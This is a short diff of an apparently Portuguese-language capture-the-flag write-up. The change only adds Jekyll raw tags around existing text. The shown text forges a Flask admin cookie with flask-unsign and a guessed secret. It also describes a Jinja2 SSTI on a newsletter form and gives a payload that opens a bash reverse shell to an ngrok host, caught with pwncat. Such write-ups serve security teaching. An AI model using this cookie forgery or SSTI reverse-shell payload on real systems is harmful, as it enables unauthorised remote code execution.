@@ -96,12 +96,16 @@ flask-unsign --sign --cookie "{'role': 'admin'}" --secret 'iloveyou'
 
 ### Dedicated — 800pts
 
+{% raw %}
 Formulário de newsletter vulnerável. XSS confirma injeção. SSTI Jinja2 identificado com `{{7*7}}`. RCE via `namespace.__init__.__globals__` + reverse shell através de ngrok + pwncat.
+{% endraw %}
 
+{% raw %}
 ```python
 # SSTI payload
 {{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/<ngrok>/PORT 0>&1"').read() }}
 ```
+{% endraw %}
 
 ```bash
 pwncat-cs -lp PORT
